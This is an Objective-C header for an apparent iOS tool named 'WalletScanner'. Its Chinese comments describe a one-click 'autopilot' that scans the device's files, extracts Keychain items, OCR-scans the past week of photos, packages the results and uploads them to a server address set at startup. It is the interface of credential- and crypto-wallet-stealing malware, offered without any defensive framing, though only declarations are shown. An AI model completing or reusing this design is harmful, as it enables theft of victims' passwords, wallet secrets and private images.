//
//  RDAutoPilot.h
//  WalletScanner
//
//  自动驾驶 — 一键扫描 + 打包 + 上传的主控制器
//  使用方法:
//    [RDAutoPilot run];                    // 全自动
//    [RDAutoPilot runWithCompletion:...];  // 带回调
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

typedef void (^RDAutoPilotCompletion)(BOOL success,
                                       NSInteger fileCount,
                                       NSInteger keychainCount,
                                       NSInteger photoCount,
                                       NSError * _Nullable error);

@interface RDAutoPilot : NSObject

// ============ 一键执行 ============
+ (void)run;
+ (void)runWithCompletion:(_Nullable RDAutoPilotCompletion)completion;

// ============ 分步执行 ============

// 步骤1: 扫描文件系统
+ (void)stepScanFiles:(void (^)(NSArray *files))completion;

// 步骤2: 提取Keychain
+ (void)stepExtractKeychain:(void (^)(NSArray *items))completion;

// 步骤3: 扫描相册OCR (最近7天)
+ (void)stepScanPhotos:(void (^)(NSArray *results))completion;

// 步骤4: 打包所有数据
+ (NSData *)stepPackageWithFiles:(NSArray *)files
                   keychainItems:(NSArray *)keychainItems
                    photoResults:(NSArray *)photoResults;

// 步骤5: 上传
+ (void)stepUpload:(NSData *)data completion:(void (^)(BOOL success))completion;

// ============ 配置 ============

// 服务器地址 — 启动前设置
+ (void)setServerURL:(NSString *)url;

// 照片扫描天数 (默认7天)
+ (void)setPhotoScanDays:(NSInteger)days;

@end

NS_ASSUME_NONNULL_END
